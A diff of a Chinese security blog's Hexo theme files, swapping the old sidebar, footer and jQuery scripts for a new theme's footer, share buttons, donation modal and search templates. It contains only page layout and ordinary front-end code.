-				<li><a href="/tags/内网渗透/" title="内网渗透">内网渗透<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/信息收集/" title="信息收集">信息收集<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/Flask/" title="Flask">Flask<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/kali/" title="kali">kali<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/端口扫描/" title="端口扫描">端口扫描<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/Docker/" title="Docker">Docker<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/SQL注入/" title="SQL注入">SQL注入<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/WIFI热点伪造/" title="WIFI热点伪造">WIFI热点伪造<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/Celery/" title="Celery">Celery<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/任意文件上传/" title="任意文件上传">任意文件上传<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/分布式/" title="分布式">分布式<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/sudo/" title="sudo">sudo<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/想法/" title="想法">想法<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/社工工程学/" title="社工工程学">社工工程学<sup>1</sup></a></li>
-			
-		
-		</ul>
-</div>
+    
 
 
-  <div class="linkslist">
-  <p class="asidetitle">Links</p>
-    <ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <ul class="reward-items">
         
-          <li>
-            
-            	<a href="http://navisec.it" target="_blank" title="信息安全从业简明导航">Navisec.it</a>
-            
-          </li>
+        <li>
+            <img src="/img/wechat.jpg" title="微信打赏二维码" alt="微信打赏二维码">
+            <p>微信</p>
+        </li>
         
-          <li>
-            
-            	<a href="http://sec-wiki.com" target="_blank" title="安全维基">Sec-Wiki</a>
-            
-          </li>
+
+        
+        <li>
+            <img src="/img/alipay.jpg" title="支付宝打赏二维码" alt="支付宝打赏二维码">
+            <p>支付宝</p>
+        </li>
         
     </ul>
 </div>
 
-  <div class="rsspart">
-	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+
+
 </div>
 
-</aside>
-</div>
-    </div>
-    <footer><div id="footer" >
-	
-	<div class="line">
-		<span></span>
-		<div class="author"></div>
-	</div>
-	
-	
-	<section class="info">
-		<p> Hello ,I&#39;m Anka9080 Page in ZorelWorld. <br/>
-			This is my blog,believe it or not.</p>
-	</section>
-	 
-	<div class="social-font" class="clearfix">
-		
-		<a href="http://weibo.com/5800672330" target="_blank" class="icon-weibo" title="微博"></a>
-		
-		
-		<a href="https://github.com/Evi1CLAY" target="_blank" class="icon-github" title="github"></a>
-		
-		
-		
-		
-		
-		
-		
-		
-		
-	</div>
-			
-		
-
-		<p class="copyright">
-		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017 
-		
-		<a href="/about" target="_blank" title="Anka9080">Anka9080</a>
-		
-		</p>
-</div>
-</footer>
-    <script src="/js/jquery-2.0.3.min.js"></script>
-<script src="/js/jquery.imagesloaded.min.js"></script>
-<script src="/js/gallery.js"></script>
-<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
-
-
-<script src="/js/instantclick.js" data-no-instant></script>
-<script data-no-instant>InstantClick.init();</script>
-
-<script type="text/javascript">
-$(document).ready(function(){ 
-  $('.navbar').click(function(){
-    $('header nav').toggleClass('shownav');
-  });
-  var myWidth = 0;
-  function getSize(){
-    if( typeof( window.innerWidth ) == 'number' ) {
-      myWidth = window.innerWidth;
-    } else if( document.documentElement && document.documentElement.clientWidth) {
-      myWidth = document.documentElement.clientWidth;
-    };
-  };
-  var m = $('#main'),
-      a = $('#asidepart'),
-      c = $('.closeaside'),
-      o = $('.openaside');
-  c.click(function(){
-    a.addClass('fadeOut').css('display', 'none');
-    o.css('display', 'block').addClass('fadeIn');
-    m.addClass('moveMain');
-  });
-  o.click(function(){
-    o.css('display', 'none').removeClass('beforeFadeIn');
-    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
-    m.removeClass('moveMain');
-  });
-  $(window).scroll(function(){
-    o.css("top",Math.max(80,260-$(this).scrollTop()));
-  });
-  
-  $(window).resize(function(){
-    getSize(); 
-    if (myWidth >= 1024) {
-      $('header nav').removeClass('shownav');
-    }else{
-      m.removeClass('moveMain');
-      a.css('display', 'block').removeClass('fadeOut');
-      o.css('display', 'none');
-      
-      $('#toc.toc-aside').css('display', 'none');
+        <footer class="footer">
+    <div class="top">
         
-    }
-  });
-});
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p>
+            <span>Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a></span>
+            <span>Anka9080 &copy; 2015 - 2017</span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/&title=《ARP协议分析与漏洞利用》 — Anka9080's Notes&pic=http://www.evilclay.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/&title=《ARP协议分析与漏洞利用》 — Anka9080's Notes&source=Python,渗透测试,安全研发" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ARP协议分析与漏洞利用》 — Anka9080's Notes&url=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/&via=http://www.evilclay.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACs0lEQVR42u3awW7bMBAE0Pz/T7dATwFquzO7pJ0CTycjUiQ9HsjVcL++4uPXn+P77+/H31c+u759yrOzhw88PDy80as/O17z2rMzxushez3ceHh4ePd4s2m6xeRPTHjRHfDw8PA+yksK67bgbp+Ih4eH93/xki/9BNkuCXh4eHg/k5eEEZu/JMFBHltcyVrw8PDwYt5sA+yzv6/v7+Hh4eGNdtXbaT0JHfJouF0MHrwbHh4e3gVe2xS1CSnyKX5WuH+1I42Hh4e35m0++Nut/U2IkPzXg4UBDw8P7xAvmXaTbaq2ZSpZBvKlpSim8fDw8A7xZhNx2xSVBBNtI0K0s4eHh4d3jdcWxKeK6SSAmF2Dh4eHd4O3+fiftVLtuxuSQKR4Ch4eHl7Ja8OIzXZ+u1TMrlzFuHh4eHhx4prfel9Gvw4mVi0Czyx4eHh4R3n7j/n9plfevtAGvnh4eHg3eLOiOd/ual9rtiTULVx4eHh4h3jt5n1+tm3e2mTPT6/Bw8PDO8prm5w2kUS+MbYvx/Hw8PDez8tvmjcZtFHFvi0MDw8P7wYviSGKkHQ0HHmYmywMeHh4eO/hrUZlVKDnT2mjZDw8PLx7vCSKvbHR1T5rWO7j4eHhXeOdbY3Kh6aIYuOw40FPGR4eHt5RXr5NNQtt23vmA9cGFnh4eHjv5LWYdpNs03BQNHLh4eHhHeXtJ/17EcaBhQEPDw/vjbxNW8CmFaBYzZIDDw8P7yhvNh23IW9+Nr/mdcPBg5QaDw8P7xBvtnjMiua2iWrTQICHh4d3m7f57J8NR56y7qNkPDw8vHu8fSPUJtrI44n8Pnh4eHg/h5cXym2jwAzzj/vg4eHhfZSXF9Obsri9Eg8PD+9TvCSMmAWvp5qr8rIeDw8P7zZvswHWTvGz122fjoeHh3eN9xulaSIW4kwWTQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+
 </script>
 
-<script type="text/javascript">
-$(document).ready(function(){ 
-  var ai = $('.article-content>iframe'),
-      ae = $('.article-content>embed'),
-      t  = $('#toc'),
-      ta = $('#toc.toc-aside'),
-      o  = $('.openaside'),
-      c  = $('.closeaside');
-  if(ai.length>0){
-    ai.wrap('<div class="video-container" />');
-  };
-  if(ae.length>0){
-   ae.wrap('<div class="video-container" />');
-  };
-  c.click(function(){
-    ta.css('display', 'block').addClass('fadeIn');
-  });
-  o.click(function(){
-    ta.css('display', 'none');
-  });
-  $(window).scroll(function(){
-    ta.css("top",Math.max(140,320-$(this).scrollTop()));
-  });
-});
-</script>
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
 
 
-<script type="text/javascript">
-$(document).ready(function(){ 
-  var $this = $('.share'),
-      url = $this.attr('data-url'),
-      encodedUrl = encodeURIComponent(url),
-      title = $this.attr('data-title'),
-      tsina = $this.attr('data-tsina'),
-      description = $this.attr('description');
-  var html = [
-  '<div class="hoverqrcode clearfix"></div>',
-  '<a class="overlay" id="qrcode"></a>',
-  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
-  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
-  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
-  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
-  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
-  '<span title="Share to"></span>'
-  ].join('');
-  $this.append(html);
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
 
-  $('.hoverqrcode').hide();
-
-  var myWidth = 0;
-  function updatehoverqrcode(){
-    if( typeof( window.innerWidth ) == 'number' ) {
-      myWidth = window.innerWidth;
-    } else if( document.documentElement && document.documentElement.clientWidth) {
-      myWidth = document.documentElement.clientWidth;
-    };
-    var qrsize = myWidth > 1024 ? 200:100;
-    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
-    var p = $('.article-share-qrcode').position();
-    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
-                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
-                          .qrcode(options);
-  };
-  $(window).resize(function(){
-    $('.hoverqrcode').hide();
-  });
-  $('.article-share-qrcode').click(function(){
-    updatehoverqrcode();
-    $('.hoverqrcode').toggle();
-  });
-  $('.article-share-qrcode').hover(function(){}, function(){
-      $('.hoverqrcode').hide();
-  });
-});   
-</script>
-
-
-
-<script type="text/javascript">
-  var duoshuoQuery = {short_name:"evi1clay"};
-  (function() {
-    var ds = document.createElement('script');
-    ds.type = 'text/javascript';ds.async = true;
-    ds.src = '//static.duoshuo.com/embed.js';
-    ds.charset = 'UTF-8';
-    (document.getElementsByTagName('head')[0] 
-    || document.getElementsByTagName('body')[0]).appendChild(ds);
-  })();
-</script> 
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
 
 
 
 
 
 
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-<script type="text/javascript">
-$(document).ready(function(){ 
-  $('.article-content').each(function(i){
-    $(this).find('img').each(function(){
-      if ($(this).parent().hasClass('fancybox')) return;
-      var alt = this.alt;
-      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
-      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
     });
-    $(this).find('.fancybox').each(function(){
-      $(this).attr('rel', 'article' + i);
-    });
-  });
-  if($.fancybox){
-    $('.fancybox').fancybox();
-  }
-}); 
+})();
 </script>
 
 
 
-<!-- Analytics Begin -->
-
-
-
-
-
-<!-- Analytics End -->
-
-<!-- Totop Begin -->
-
-	<div id="totop">
-	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
-	</div>
-	<script src="/js/totop.js"></script>
-
-<!-- Totop End -->
-
-<!-- MathJax Begin -->
-<!-- mathjax config similar to math.stackexchange -->
-
-
-<!-- MathJax End -->
-
-<!-- Tiny_search Begin -->
-
-<!-- Tiny_search End -->
-
-  </body>
+</body>
 </html>
